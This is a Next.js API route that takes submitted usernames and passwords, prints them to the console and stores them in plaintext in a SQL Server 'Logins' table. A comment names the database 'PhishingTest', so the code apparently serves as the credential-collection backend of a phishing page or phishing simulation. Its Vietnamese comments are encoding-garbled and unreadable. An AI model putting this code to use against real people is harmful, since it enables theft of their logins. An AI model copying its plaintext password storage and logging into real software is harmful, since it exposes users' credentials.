import { NextResponse } from 'next/server';
import sql from 'mssql';

// üìå C·∫•u h√¨nh k·∫øt n·ªëi SQL Server
const config: sql.config = {
  server: process.env.DB_SERVER!,         // V√≠ d·ª•: 'localhost'
  database: process.env.DB_DATABASE!,     // V√≠ d·ª•: 'PhishingTest'
  user: process.env.DB_USER!,             // V√≠ d·ª•: 'sa' ho·∫∑c 'Truong'
  password: process.env.DB_PASSWORD!,     // M·∫≠t kh·∫©u t√†i kho·∫£n SQL
  options: {
    encrypt: true,                        // Gi·ªØ nguy√™n n·∫øu d√πng SQL Server
    trustServerCertificate: true,         // Cho ph√©p t·ª± k√Ω SSL
  },
};

export async function POST(req: Request) {
  try {
    // üì• L·∫•y d·ªØ li·ªáu t·ª´ request
    const { username, password } = await req.json();

    console.log('üü¢ D·ªØ li·ªáu nh·∫≠n:', { username, password });

    // üß© K·∫øt n·ªëi t·ªõi database
    const pool = await sql.connect(config);
    console.log('‚úÖ K·∫øt n·ªëi database th√†nh c√¥ng');

    // ‚úÖ T·∫°o b·∫£ng n·∫øu ch∆∞a c√≥ (t√πy ch·ªçn, c√≥ th·ªÉ b·ªè n·∫øu ch·∫Øc ch·∫Øn b·∫£ng t·ªìn t·∫°i)
    await pool.request().query(`
      IF NOT EXISTS (SELECT * FROM sysobjects WHERE name='Logins' AND xtype='U')
      CREATE TABLE Logins (
        id INT IDENTITY(1,1) PRIMARY KEY,
        username NVARCHAR(255),
        password NVARCHAR(255),
        created_at DATETIME DEFAULT GETDATE()
      )
    `);

    // ‚úçÔ∏è Ghi d·ªØ li·ªáu v√†o b·∫£ng Logins
    await pool
      .request()
      .input('username', sql.NVarChar, username)
      .input('password', sql.NVarChar, password)
      .query('INSERT INTO Logins (username, password) VALUES (@username, @password)');

    console.log('‚úÖ L∆∞u th√†nh c√¥ng');
    return NextResponse.json({ message: 'Success' }, { status: 200 });

  } catch (error) {
    console.error('‚ùå L·ªói ghi v√†o DB:', error);
    return NextResponse.json({ message: 'Internal Server Error' }, { status: 500 });
  }
}
